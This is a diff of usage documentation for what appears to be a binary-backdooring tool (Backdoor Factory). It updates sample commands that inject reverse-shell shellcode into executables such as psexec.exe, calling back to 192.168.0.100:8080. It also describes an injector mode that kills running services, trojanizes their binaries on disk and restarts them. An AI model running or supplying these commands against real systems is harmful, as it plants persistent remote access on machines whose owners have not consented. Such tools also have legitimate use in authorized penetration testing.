@@ -167,7 +167,7 @@ Sample Usage:
 
 ###Patch an exe/dll using an existing code cave:
 
-    ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp 
+    ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp_inline 
 
     [*] In the backdoor module
     [*] Checking if binary is supported
@@ -208,7 +208,7 @@ Sample Usage:
 
 ###Patch an exe/dll by adding a code section:
 
-    ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a 
+    ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp_inline -a 
     [*] In the backdoor module
     [*] Checking if binary is supported
     [*] Gathering file info
@@ -275,7 +275,7 @@ On successful run you should see this line in BDF output:
     The injector module will look for target executables to backdoor on disk.  It will check to see if you have identified the target as a service, check to see if the process is running, kill the process and/or service, inject the executable with the shellcode, save the original file to either file.exe.old or another suffix of choice, and attempt to restart the process or service.  
     Edit the python dictionary "list_of_targets" in the 'injector' module for targets of your choosing.
 
-    ./backdoor.py -i -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a -u .moocowwow 
+    ./backdoor.py -i -H 192.168.0.100 -P 8080 -s reverse_shell_tcp_inline -a -u .moocowwow 
 
 ---
 
